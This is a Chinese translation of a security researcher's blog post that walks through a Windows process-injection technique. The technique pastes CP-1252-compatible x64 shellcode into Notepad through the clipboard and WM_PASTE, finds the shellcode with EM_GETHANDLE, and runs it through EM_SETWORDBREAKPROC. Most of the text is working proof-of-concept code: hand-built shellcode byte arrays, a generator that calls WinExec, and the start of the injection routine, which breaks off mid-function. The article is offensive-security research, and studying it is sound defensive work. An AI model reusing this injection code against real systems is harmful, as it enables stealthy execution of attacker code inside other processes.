# Windows进程注入：EM_GETHANDLE、WM_PASTE和EM_SETWORDBREAKPROC

阅读量 **298984**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-07-22 14:30:51

 **x**

##### 译文声明

本文是翻译文章，文章原作者 modexp，文章来源：modexp.wordpress.com

原文地址：<https://modexp.wordpress.com/2020/07/07/wpi-wm-paste/>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t017d016a3afb97f431.jpg)

## 0x00 介绍

2002年8月，Kristin Paget首次描述了“Shatter
attacks”（粉碎攻击），使用Windows消息实现特权提升。在早期的示例中，演示了如何使用`WM_SETTEXT`实现代码注入，并使用`WM_TIMER`执行代码的过程。Microsoft在2002年12月发布补丁尝试修复这一问题，而在此之后Oliver
Lavery又演示了`EM_SETWORDBREAKPROC`如何执行代码。Kristin
Paget在2003年8月发表了一篇后续文章和演示文稿，描述了其他有关代码重定向的问题。Brett
Moore还在2003年10月发表了一篇论文，其中包含可以用于注入和重定向的所有消息的完整列表。

如果不关注Windows本身的设计，就可能会发生Shatter攻击，原因有两个：共享同一个交互式桌面的进程之间没有隔离，并且允许代码从栈和堆中运行。从Windows
Vista和Windows Server
2008开始，用户界面特权隔离（UIPI）功能通过定义一组UI特权级别来解决其中的第一个问题，以防止低特权进程将消息发送至高特权进程。而在较早就引入到Windows
XP Service Pack
2中的数据执行保护（DEP）功能解决了第二个问题。如果同时启用这两个功能，Shatter攻击将不再有效。尽管DEP和UIPI阻止了Shatter攻击，但它们并不会阻止使用窗口消息实现代码注入。

ESET最近发表了一篇有关Invisimole恶意软件的文章，引起了人们对其使用`LVM_SETITEMPOSITION`和`LVM_GETITEMPOSITION`实现注入，并使用`LVM_SORTITEMS`实现执行的关注。使用`LVM_SORTITEMS`执行代码最初是Kristin
Paget在Blackhat 2003上首先提出的，后来由Adam重新发现。PoC代码已经在此前的博客文章中发布过，并且Csaba
Fitzl也写过该漏洞的PoC。

在本文中，我编写了一个新的PoC，可以执行以下操作：

1、使用剪贴板和`WM_PASTE`消息，将代码注入到记事本进程中；  
2、使用`EM_GETHANDLE`消息和`ReadProcessMemory`获取我们的代码的缓冲区地址；  
3、使用`VirtualProtectEx`将内存权限从读写更改为读写执行；  
4、使用`EM_SETWORDBREAKPROC`和`WM_LBUTTONDBLCLK`执行Shellcode。

尽管使用了`VirtualProtectEx`，但还是可能在禁用DEP的情况下运行记事本。还需要指出的是，这里的Shellcode是针对CP-1251编码而设计的，并非UTF-8编码，因此PoC可能无法在所有系统上运行。注入的方法将会成功，但是在转换为Unicode后，记事本可能会出现崩溃。

## 0x01 编辑控件

Adam在“Talking to, and handling (edit)
boxes”文章中写道，通过编辑控件，并使用`EM_GETHANDLE`，可以获得代码存储位置的地址。以记事本为例，可以打开一个包含可执行代码的文件，或者使用剪贴板和`WM_PASTE`消息注入到记事本中。

要显示编辑控件输入存储在内存中的位置，可以运行笔记本，并输入“modexp”。使用WinDbg打开并输入以下命令：`!address /f:Heap
/c:”s -u %1 %2
”modexp””`。这样一来，将会在堆内存中搜索Unicode字符串“modexp”。为什么要使用Unicode？因为从Comctl32.dll的版本6开始，控件就仅使用Unicode。下图展示了该命令的输出结果。

在内存中搜索记事本的字符串：

![](https://p0.ssl.qhimg.com/t017da4d62dfff79836.png)

要读取编辑控件具柄，我们可以将`EM_GETHANDLE`发送到窗口句柄。或者，我们可以使用`GetWindowLongPtr(0)`和`ReadProcessMemory(ULONG_PTR)`，但是`EM_GETHANDLE`则是在一次调用中直接完成。下图展示了执行以下代码的结果。

    
    
        hw = FindWindow("Notepad", NULL);
        hw = FindWindowEx(hw, NULL, "Edit", NULL);
        emh = (PVOID)SendMessage(hw, EM_GETHANDLE, 0, 0); 
        printf("EM Handle : %pn", emh);
    

`EM_GETHANDLE`返回的内存指针：

![](https://p2.ssl.qhimg.com/t0122add7398520551b.png)

该句柄指向分配给输入的缓冲区，如下图所示。

为输入分配的缓冲区：

![](https://p1.ssl.qhimg.com/t019eb646b1900dcd5d.png)

由于输入是以Unicode格式存储的，因此无法将任何Shellcode复制到剪贴板并粘贴到编辑控件中。在我的系统上，记事本使用CP_ACP代码页（使用Windows-1252，即CP-1252编码）将剪贴板数据转换为Unicode。CP-1252是单字节字符集，默认情况下在Microsoft
Windows的旧版本组件中使用，用于拉丁字母衍生的语言。记事本在收到`WM_PASTE`消息后，它将以`CF_UNICODETEXT`作为格式，调用`GetClipboardData()`。在内部，这个过程会调用`GetClipboardCodePage()`，在我的系统上该函数将返回`CP_ACP`，然后再调用`MultiByteToWideChar()`将文本转换为Unicode格式。包含在[0x80,
0x8C]、[0x91, 0x9C]范围内的字符，或者等于0x8E、0x9E、0x9F的字符将转换为双字节字符编码。对于UTF-8来说，只能使用[0x01,
0x7F]范围内的字节。

## 0x02 编写CP-1252兼容代码

我们先来看一下x86/x64指令，这些指令可以在使用`CP_ACP`作为代码页的`MultiByteToWideChar()`转换后安全使用。

###  2.1 初始化

在整个代码中，我们将看到以下内容。

    
    
    "x00x4dx00"         /* add   byte [rbp], cl */
    

我们可以将其视为NOP指令，因为它仅用于在其他指令之间插入空字节，以便最终汇编代码与CP-1252兼容。使用BP需要三个字节，几乎可以立即使用。  
实际上，最后一部分的描述并不正确。对于32位模式，创建栈帧是任何过程中通常要做的一件事，在以前针对Unicode
Shellcode的研究人员正确地假设了BP包含堆栈指针（SP）的值。除非BP被意外覆盖，否则在32位系统上使用此指令进行的任何写操作都不会引起异常。但是，对于64位则不能一概而论，要取决于编译器通常避免使用BP来寻址局部变量。因此，在执行其他任何操作之前，我们必须先将SP复制到BP。在1-5个字节的限制范围内，我认为唯一可用的指令就是`ENTER`。我们要做的另一件事就是将AL设置为0，这样我们就不会覆盖RBP包含的堆栈地址上的任何内容。接下来是分配256字节的内存，并将SP复制到BP。

    
    
        ; ************************* prolog
        mov    al, 0
        enter  256, 0
    
        ; save rbp
        push   rbp
        add    [rbp], al
    
        ; create local variable for rbp
        push   0
        push   rsp
        add    [rbp], al
    
        pop    rbp
        add    [rbp], cl
    

如果我们检查`EDITWORDBREAKPROCA`回调函数，可以看到`lpch`是指向编辑控件文本的指针。

    
    
    EDITWORDBREAKPROCA EDITWORDBREAKPROCA;
    
    int EDITWORDBREAKPROCA(
      LPSTR lpch,
      int ichCurrent,
      int cch,
      int code
    )
    {...}
    

如果大家熟悉Microsoft针对x64模式的fastcall约定，那么我们就知道前四个参数位于RCX、RDX、R8和R9中。该回调会将`lpch`加载到RCX中，以后将非常有用。

###  2.2 将RAX设置为0

`PUSH 0`在堆栈上创建一个局部变量，并对其赋值为0。然后，将变量使用`POP RAX`加载。

    
    
    "x6ax00"             /* push  0                   */
    "x58"                 /* pop   rax                 */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    

将0xFF00FF00复制到EAX。减去0xFF00FF00。需要注意的是，这些操作会将RAX的高32位清零，并且不足以与内存地址进行加法和减法运算。

    
    
    "xb8x00xffx00xff" /* mov   eax, 0xff00ff00     */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    "x2dx00xffx00xff" /* sub   eax, 0xff00ff00     */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    

将0xFF00FF00复制到EAX，与0xFF00FF00按位异或。

    
    
    "xb8x00xffx00xff" /* mov   eax, 0xff00ff00     */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    "x35x00xffx00xff" /* xor   eax, 0xff00ff00     */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    

将0xFF00FF00复制到EAX，与0x01000100按位与。

    
    
    "xb8x00xfex00xfe" /* mov   eax, 0xfe00fe00     */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    "x25x00x01x00x01" /* and   eax, 0x01000100      */
    "x00x4dx00"         /* add   byte [rbp], cl      */
    

###  2.3 将RAX设置为1

`PUSH 0`创建一个我们称为X的局部变量，并将其值指定为0。`PUSH RSP`创建一个我们称为A的局部变量，并指定X的地址。`POP
RAX`将A加载到RAX寄存器中。`INC DWORD[RAX]`将1分配给X。`POP RAX`将X加载到RAX寄存器中。

    
    
    "x6ax00"     /* push 0              */
    "x54"         /* push rsp            */
    "x00x4dx00" /* add  byte [rbp], cl */
    "x58"         /* pop  rax            */
    "x00x4dx00" /* add  byte [rbp], cl */
    "xffx00"     /* inc  dword [rax]    */
    "x58"         /* pop  rax            */
    "x00x4dx00" /* add  byte [rbp], cl */
    

`PUSH 0`创建一个我们称为X的局部变量，并将其值指定为0。`PUSH RSP`创建一个我们称为A的局部变量，并指定X的地址。`POP
RAX`将A加载到RAX寄存器中。`MOV BYTE[RAX], 1`将1分配给X。`POP RAX`将X加载到RAX寄存器中。

    
    
    "x6ax00"         /* push  0              */
    "x54"             /* push  rsp            */
    "x00x4dx00"     /* add   byte [rbp], cl */
    "x58"             /* pop   rax            */
    "x00x4dx00"     /* add   byte [rbp], cl */
    "xc6x00x01"     /* mov   byte [eax], 1  */
    "x00x4dx00"     /* add   byte [rbp], cl */
    "x58"             /* pop   rax            */
    "x00x4dx00"     /* add   byte [rbp], cl */
    

###  2.4 将RAX设置为-1

`PUSH 0`创建一个我们称为X的局部变量，并将其值指定为0。`POP RCX`将X加载到RCX寄存器中。`LOOP
$+2`使RCX减小1，得到-1。`PUSH RCX`在堆栈上存储-1，`POP RAX`将RAX设置为-1。

    
    
    "x6ax00"         /* push  0              */
    "x59"             /* pop   rcx            */
    "x00x4dx00"     /* add   byte [rbp], cl */
    "xe2x00"         /* loop  $+2            */
    "x34x00"         /* xor   al, 0          */
    "x51"             /* push  rcx            */
    "x00x4dx00"     /* add   byte [rbp], cl */
    "x58"             /* pop   rax            */
    

`PUSH 0`创建一个我们称为X的局部变量，并将其值指定为0。`PUSH RSP`创建一个我们称为A的局部变量，并指定为X的地址。`POP
RAX`将A加载到RAX寄存器中。`MOV BYTE[RAX], 1`将1分配给X。`IMUL EAX, DWORD[RAX],
-1`将X乘以-1，并将结果存储在EAX中。

    
    
    "x6ax00"     /* push 0                    */
    "x54"         /* push rsp                  */
    "x00x4dx00" /* add  byte [rbp], cl       */
    "x58"         /* pop  rax                  */
    "x00x4dx00" /* add  byte [rbp], cl       */
    "xffx00"     /* inc  dword [rax]          */
    "x6bx00xff" /* imul eax, dword [rax], -1 */
    "x00x4dx00" /* add  byte [rbp], cl       */
    "x59"         /* pop  rcx                  */
    

###  2.5 加载和存储数据

从上述示例可以看出，将寄存器初始化为0、1或-1是完全可以的。要想加载任意数据却有些棘手，但是我们可以通过一些方法来发挥创意。  
例如，将EAX设置为0x12345678。

    
    
    "xb8x78x56x34x12" /* mov   eax, 0x12345678  */
    

这里，将使用IMUL，将EAX设置为0x00340078，随后与0x12005600进行异或。

    
    
    "x6ax00"                 /* push 0                          */
    "x54"                     /* push rsp                        */
    "x00x4dx00"             /* add  byte [rbp], cl             */
    "x58"                     /* pop  rax                        */
    "x00x4dx00"             /* add  byte [rbp], cl             */
    "xffx00"                 /* inc  dword [rax]                */
    "x69x00x78x00x34x00" /* imul eax, dword [rax], 0x340078 */
    "x58"                     /* pop  rax                        */
    "x00x4dx00"             /* add  byte [rbp], cl             */
    "x35x00x56x00x12"     /* xor  eax, 0x12005600            */
    

通过将0存储在堆栈中，创建一个名为X的局部变量。创建一个名为A的局部变量，其中包含X的地址。将A加载到RAX中。使用`MOV DWORD[RAX],
0x00340078`将0x00340078存储到X中。将X加载到RAX中。将EAX与0x12005600进行异或。现在，EAX的值就是0x12345678。

    
    
    "x6ax00"                 /* push   0                      */
    "x54"                     /* push   rsp                    */
    "x00x4dx00"             /* add    byte [rbp], cl         */
    "x58"                     /* pop    rax                    */
    "x00x4dx00"             /* add    byte [rbp], cl         */
    "xc7x00x78x00x34x00" /* mov    dword [rax], 0x340078  */
    "x58"                     /* pop    rax                    */
    "x00x4dx00"             /* add    byte [rbp], cl         */
    "x35x00x56x00x12"     /* xor    eax, 0x12005600        */
    "x00x4dx00"             /* add    byte [rbp], cl         */
    

使用左旋转（ROX）的另一种方法。

    
    
    "x68x00x78x00x34" /* push  0x34007800        */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "x54"                 /* push  rsp               */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "x58"                 /* pop   rax               */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "xc1x00x18"         /* rol   dword [rax], 0x18 */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "x58"                 /* pop   rax               */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "x35x00x56x00x12" /* xor   eax, 0x12005600   */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    

使用MOV和ROL的另一个示例。

    
    
    "x68x00x56x00x12" /* push  0x12005600        */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "x54"                 /* push  rsp               */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "x58"                 /* pop   rax               */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "xc6x00x78"         /* mov   byte [rax], 0x78  */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "xc1x00x10"         /* rol   dword [rax], 0x10 */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "xc6x00x34"         /* mov   byte [rax], 0x34  */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "xc1x00x10"         /* rol   dword [rax], 0x10 */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "x58"                 /* pop   rax               */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    

最后一个示例使用了MOV、ADD、SCASB，并将缓冲区的地址存储在RDI中。

    
    
    "x6ax00"             /* push  0                 */
    "x54"                 /* push  rsp               */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "x5f"                 /* pop   rdi               */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "xb8x00x12x00xff" /* mov   eax, 0xff001200   */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "xbbx00x34x00xff" /* mov   ebx, 0xff003400   */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "xb9x00x56x00xff" /* mov   ecx, 0xff005600   */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "xbax00x78x00xff" /* mov   edx, 0xff007800   */
    "x00x27"             /* add   byte [rdi], ah    */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "xae"                 /* scasb                   */
    "x00x3f"             /* add   byte [rdi], bh    */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "xae"                 /* scasb                   */
    "x00x2f"             /* add   byte [rdi], ch    */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "xae"                 /* scasb                   */
    "x00x37"             /* add   byte [rdi], dh    */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    "x58"                 /* pop   rax               */
    "x00x4dx00"         /* add   byte [rbp], cl    */
    

###  2.6 双字节指令

如果我们只需要包含一个空字节的双字节指令，则可以考虑以下的操作。对于分支指令，无论条件是真还是假，该指令始终分支到下一个地址。如果要从地址中减去1，那么循环指令可能很有帮助。要将地址增加1或4，可以将其复制到RDI中并使用SCASB或SCASD。如果在地址RSI中，也可以使用LODSB或LODSD，但需要注意的是它们分别覆盖了AL和EAX。

    
    
        ; logic
        or al, 0
    
        xor al, 0
    
        and al, 0
    
        ; arithmetic
        add al, 0
    
        adc al, 0
    
        sbb al, 0
    
        sub al, 0
    
        ; comparison predicates
        cmp al, 0
    
        test al, 0
    
        ; data transfer
        mov al, 0
        mov ah, 0
    
        mov bl, 0
        mov bh, 0
    
        mov cl, 0
        mov ch, 0
    
        mov dl, 0
        mov dh, 0
    
        ; branches
        jmp $+2
    
        jo $+2
        jno $+2
    
        jb $+2
        jae $+2
    
        je $+2
        jne $+2
    
        jbe $+2
        ja $+2
    
        js $+2
        jns $+2
    
        jp $+2
        jnp $+2
    
        jl $+2
        jge $+2
    
        jle $+2
        jg $+2
    
        jrcxz $+2
    
        loop $+2
    
        loope $+2
    
        loopne $+2
    

###  2.7 前缀代码

其中的一些前缀可以用于填充指令。我所测试的唯一指令是8位操作。

0x2E、0x3E：分支提示对任何奔腾4以上的设备都没有影响。在指令之间的1字节空间是无害的。

0xF0：LOCK前缀，可确保指令具有对所有共享内存的独有权，直至指令执行完成为止。

0xF2、0xF3：REP（0xF2）告诉CPU重复执行诸如MOVS、STOS、CMPS、SCAS这样的字符串操作命令，直到RCX为0为止。REPNE（0xF3）重复执行，直到RCX为0或零标志（ZF）为止。

0x26、0x2E、0x36、0x3E、0x64、0x65：附加段（ES）（0x26）前缀用于字符串操作的目标。所有指令的代码段（CS）（0x2E）与分支提示相同，并且无效。堆栈段（0x36）用于通过PUSH/POP等指令存储和加载局部变量。数据段（DS）（0x3E）用于除堆栈外的所有数据引用，也与分支提示相同，没有影响。FS（0x64）和GS（0x65）没有指定，但我们可以看到，它们用于访问Windows上的线程环境块（TEB）或Linux上的线程本地存储（TLS）。

0x66、0x67：用于覆盖PUSH/POP或MOV在32位模式下数据类型的默认大小。NASM/YASM使用a16、a32、o16和o32支持操作数大小（0x66）和操作数地址（0x67）前缀。

0x40-0x4F：64位模式的REX前缀。

## 0x03 生成Shellcode

在我们编写Shellcode时，还有一些因素需要考虑。

1、保留所有的非易失性寄存器，包括RSI、RDI、RBP和RBX。  
2、为homespace分配32个字节，我们调用的任何API都将用到它。  
3、调用API之前，需确保SP的值与16字节减去8对齐。

一些API会使用SIMD指令，通常用于小数据块的`memcpy()`或`memset()`。为了获得最佳性能，访问的数据必需对其16个字节。如果堆栈指针未对齐，并且使用SIMD指令读取或写入SP，将会导致未处理的异常。由于我们无法使用CALL指令，因此就会使用RET，一旦执行后，将从堆栈中删除API地址。如果这个时候没有按照16字节对齐，那就麻烦了。

使用前面的示例，以下代码将构造一个与CP-1252兼容的Shellcode，以使用`kernel32!WinExec()`来执行`calc.exe`。这一过程仅仅是为了演示通过记事本编辑控件的注入过程可以成功。

    
    
    // the max address for virtual memory on 
    // windows is (2 ^ 47) - 1 or 0x7FFFFFFFFFFF
    #define MAX_ADDR 6
    
    // only useful for CP_ACP codepage
    static
    int is_cp1252_allowed(int ch) {
    
        // zero is allowed, but we can't use it for the clipboard
        if(ch == 0) return 0;
    
        // bytes converted to double byte characters
        if(ch >= 0x80 && ch <= 0x8C) return 0;
        if(ch >= 0x91 && ch <= 0x9C) return 0;
    
        return (ch != 0x8E && ch != 0x9E && ch != 0x9F);
    }
    
    // Allocate 64-bit buffer on the stack.
    // Then place the address in RDI for writing.
    #define STORE_ADDR_SIZE 10
    
    char STORE_ADDR[] = {
      /* 0000 */ "x6ax00"             /* push 0                */
      /* 0002 */ "x54"                 /* push rsp              */
      /* 0003 */ "x00x5dx00"         /* add  byte [rbp], cl   */
      /* 0006 */ "x5f"                 /* pop  rdi              */
      /* 0007 */ "x00x5dx00"         /* add  byte [rbp], cl   */
    };
    
    // Load an 8-Bit immediate value into AH
    #define LOAD_BYTE_SIZE 5
    
    char LOAD_BYTE[] = {
      /* 0000 */ "xb8x00xffx00x4d" /* mov   eax, 0x4d00ff00 */
    };
    
    // Subtract 32 from AH
    #define SUB_BYTE_SIZE 8
    
    char SUB_BYTE[] = {
      /* 0000 */ "x00x5dx00"         /* add   byte [rbp], cl  */
      /* 0003 */ "x2dx00x20x00x5d" /* sub   eax, 0x4d002000 */
    };
    
    // Store AH in buffer and advance RDI by 1
    #define STORE_BYTE_SIZE 9
    
    char STORE_BYTE[] = {
      /* 0000 */ "x00x27"             /* add   byte [rdi], ah  */
      /* 0002 */ "x00x5dx00"         /* add   byte [rbp], cl  */
      /* 0005 */ "xae"                 /* scasb                 */
      /* 0006 */ "x00x5dx00"         /* add   byte [rbp], cl  */
    };
    
    // Transfers control of execution to kernel32!WinExec
    #define RET_SIZE 2
    
    char RET[] = {
      /* 0000 */ "xc3" /* ret  */
      /* 0002 */ "x00"
    };
    
    #define CALC3_SIZE 164
    #define RET_OFS 0x20 + 2
    
    char CALC3[] = {
      /* 0000 */ "xb0x00"                 /* mov   al, 0                 */
      /* 0002 */ "xc8x00x01x00"         /* enter 0x100, 0              */
      /* 0006 */ "x55"                     /* push  rbp                   */
      /* 0007 */ "x00x45x00"             /* add   byte [rbp], al        */
      /* 000A */ "x6ax00"                 /* push  0                     */
      /* 000C */ "x54"                     /* push  rsp                   */
      /* 000D */ "x00x45x00"             /* add   byte [rbp], al        */
      /* 0010 */ "x5d"                     /* pop   rbp                   */
      /* 0011 */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 0014 */ "x57"                     /* push  rdi                   */
      /* 0015 */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 0018 */ "x56"                     /* push  rsi                   */
      /* 0019 */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 001C */ "x53"                     /* push  rbx                   */
      /* 001D */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 0020 */ "xb8x00x4dx00xff"     /* mov   eax, 0xff004d00       */
      /* 0025 */ "x00xe1"                 /* add   cl, ah                */
      /* 0027 */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 002A */ "xb8x00x01x00xff"     /* mov   eax, 0xff000100       */
      /* 002F */ "x00xe5"                 /* add   ch, ah                */
      /* 0031 */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 0034 */ "x51"                     /* push  rcx                   */
      /* 0035 */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 0038 */ "x5b"                     /* pop   rbx                   */
      /* 0039 */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 003C */ "x6ax00"                 /* push  0                     */
      /* 003E */ "x54"                     /* push  rsp                   */
      /* 003F */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 0042 */ "x5f"                     /* pop   rdi                   */
      /* 0043 */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 0046 */ "x57"                     /* push  rdi                   */
      /* 0047 */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 004A */ "x59"                     /* pop   rcx                   */
      /* 004B */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 004E */ "x6ax00"                 /* push  0                     */
      /* 0050 */ "x54"                     /* push  rsp                   */
      /* 0051 */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 0054 */ "x58"                     /* pop   rax                   */
      /* 0055 */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 0058 */ "xc7x00x63x00x6cx00" /* mov   dword [rax], 0x6c0063 */
      /* 005E */ "x58"                     /* pop   rax                   */
      /* 005F */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 0062 */ "x35x00x61x00x63"     /* xor   eax, 0x63006100       */
      /* 0067 */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 006A */ "xab"                     /* stosd                       */
      /* 006B */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 006E */ "x6ax00"                 /* push  0                     */
      /* 0070 */ "x54"                     /* push  rsp                   */
      /* 0071 */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 0074 */ "x58"                     /* pop   rax                   */
      /* 0075 */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 0078 */ "xc6x00x05"             /* mov   byte [rax], 5         */
      /* 007B */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 007E */ "x5a"                     /* pop   rdx                   */
      /* 007F */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 0082 */ "x53"                     /* push  rbx                   */
      /* 0083 */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 0086 */ "x6ax00"                 /* push  0                     */
      /* 0088 */ "x6ax00"                 /* push  0                     */
      /* 008A */ "x6ax00"                 /* push  0                     */
      /* 008C */ "x6ax00"                 /* push  0                     */
      /* 008E */ "x6ax00"                 /* push  0                     */
      /* 0090 */ "x53"                     /* push  rbx                   */
      /* 0091 */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 0094 */ "x90"                     /* nop                         */
      /* 0095 */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 0098 */ "x90"                     /* nop                         */
      /* 0099 */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 009C */ "x90"                     /* nop                         */
      /* 009D */ "x00x4dx00"             /* add   byte [rbp], cl        */
      /* 00A0 */ "x90"                     /* nop                         */
      /* 00A1 */ "x00x4dx00"             /* add   byte [rbp], cl        */
    };
    
    #define CALC4_SIZE 79
    #define RET_OFS2 0x18 + 2
    
    char CALC4[] = {
      /* 0000 */ "x59"                 /* pop  rcx              */
      /* 0001 */ "x00x4dx00"         /* add  byte [rbp], cl   */
      /* 0004 */ "x59"                 /* pop  rcx              */
      /* 0005 */ "x00x4dx00"         /* add  byte [rbp], cl   */
      /* 0008 */ "x59"                 /* pop  rcx              */
      /* 0009 */ "x00x4dx00"         /* add  byte [rbp], cl   */
      /* 000C */ "x59"                 /* pop  rcx              */
      /* 000D */ "x00x4dx00"         /* add  byte [rbp], cl   */
      /* 0010 */ "x59"                 /* pop  rcx              */
      /* 0011 */ "x00x4dx00"         /* add  byte [rbp], cl   */
      /* 0014 */ "x59"                 /* pop  rcx              */
      /* 0015 */ "x00x4dx00"         /* add  byte [rbp], cl   */
      /* 0018 */ "xb8x00x4dx00xff" /* mov  eax, 0xff004d00  */
      /* 001D */ "x00xe1"             /* add  cl, ah           */
      /* 001F */ "x00x4dx00"         /* add  byte [rbp], cl   */
      /* 0022 */ "x51"                 /* push rcx              */
      /* 0023 */ "x00x4dx00"         /* add  byte [rbp], cl   */
      /* 0026 */ "x58"                 /* pop  rax              */
      /* 0027 */ "x00x4dx00"         /* add  byte [rbp], cl   */
      /* 002A */ "xc6x00xc3"         /* mov  byte [rax], 0xc3 */
      /* 002D */ "x00x4dx00"         /* add  byte [rbp], cl   */
      /* 0030 */ "x59"                 /* pop  rcx              */
      /* 0031 */ "x00x4dx00"         /* add  byte [rbp], cl   */
      /* 0034 */ "x5b"                 /* pop  rbx              */
      /* 0035 */ "x00x4dx00"         /* add  byte [rbp], cl   */
      /* 0038 */ "x5e"                 /* pop  rsi              */
      /* 0039 */ "x00x4dx00"         /* add  byte [rbp], cl   */
      /* 003C */ "x5f"                 /* pop  rdi              */
      /* 003D */ "x00x4dx00"         /* add  byte [rbp], cl   */
      /* 0040 */ "x59"                 /* pop  rcx              */
      /* 0041 */ "x00x4dx00"         /* add  byte [rbp], cl   */
      /* 0044 */ "x6ax00"             /* push 0                */
      /* 0046 */ "x58"                 /* pop  rax              */
      /* 0047 */ "x00x4dx00"         /* add  byte [rbp], cl   */
      /* 004A */ "x5c"                 /* pop  rsp              */
      /* 004B */ "x00x4dx00"         /* add  byte [rbp], cl   */
      /* 004E */ "x5d"                 /* pop  rbp              */
    };
    
    
    static
    u8* cp1252_generate_winexec(int pid, int *cslen) {
        int     i, ofs, outlen;
        u8      *cs, *out;
        HMODULE m;
        w64_t   addr;
    
        // it won't exceed 512 bytes
        out = (u8*)cs = VirtualAlloc(
          NULL, 4096, 
          MEM_COMMIT | MEM_RESERVE, 
          PAGE_EXECUTE_READWRITE);
    
        // initialize parameters for WinExec()
        memcpy(out, CALC3, CALC3_SIZE);
        out += CALC3_SIZE;
    
        // initialize RDI for writing
        memcpy(out, STORE_ADDR, STORE_ADDR_SIZE);
        out += STORE_ADDR_SIZE;
    
        // ***********************************
        // store kernel32!WinExec on stack
        m = GetModuleHandle("kernel32");
        addr.q = ((PBYTE)GetProcAddress(m, "WinExec") - (PBYTE)m);
        m = GetProcessModuleHandle(pid, "kernel32.dll");
        addr.q += (ULONG_PTR)m;
    
        for(i=0; i<MAX_ADDR; i++) {      
          // load a byte into AH
          memcpy(out, LOAD_BYTE, LOAD_BYTE_SIZE);
          out[2] = addr.b[i];
    
          // if byte not allowed for CP1252, add 32
          if(!is_cp1252_allowed(out[2])) {
            out[2] += 32;
            // subtract 32 from byte at runtime
            memcpy(&out[LOAD_BYTE_SIZE], SUB_BYTE, SUB_BYTE_SIZE);
            out += SUB_BYTE_SIZE;
          }
          out += LOAD_BYTE_SIZE;
          // store AH in [RDI], increment RDI
          memcpy(out, STORE_BYTE, STORE_BYTE_SIZE);
          out += STORE_BYTE_SIZE;
        }
    
        // calculate length of constructed code
        ofs = (int)(out - (u8*)cs) + 2;
    
        // first offset
        cs[RET_OFS] = (uint8_t)ofs;
    
        memcpy(out, RET, RET_SIZE);
        out += RET_SIZE;
    
        memcpy(out, CALC4, CALC4_SIZE);
    
        // second offset
        ofs = CALC4_SIZE;
        ((u8*)out)[RET_OFS2] = (uint8_t)ofs;
        out += CALC4_SIZE;
    
        outlen = ((int)(out - (u8*)cs) + 1) & -2;
    
        // convert to ascii
        for(i=0; i<=outlen; i+=2) {
          cs[i/2] = cs[i];
        }
    
        *cslen = outlen / 2;
        // return pointer to code
        return cs;
    }
    

## 0x04 注入和执行Shellcode

我们使用以下步骤。

1、执行notepad.exe，并获取编辑控件的窗口句柄；  
2、使用`EM_GETHANDLE`消息获取编辑控件句柄；  
3、生成大于等于Shellcode大小的文本，然后将其复制到剪贴板；  
4、将NULL指针分配给`lastbuf`；  
5、如果`lastbuf`和`embuf`相等，跳转到第9步；  
6、使用`WM_SETSEL`和`WM_CLEAR`清除内存缓冲区；  
7、将`WM_PASTE`消息发送到编辑控件窗口句柄，等待1秒钟，然后跳转到步骤5；  
8、将`embuf`设置为`PAGE_EXECUTE_READWRITE`；  
9、生成与CP-1252兼容的Shellcode并复制到剪贴板；  
10、使用`EM_SETWORDBREAKPROC`将编辑控件分词函数设置为`embuf`；  
11、使用`WM_LBUTTONDBLCLK`触发Shellcode的执行。

    
    
    BOOL em_inject(void) {
        HWND   npw, ecw;
        w64_t  emh, lastbuf, embuf;
        SIZE_T rd;
        HANDLE hp;
        DWORD  cslen, pid, old;
        BOOL   r;
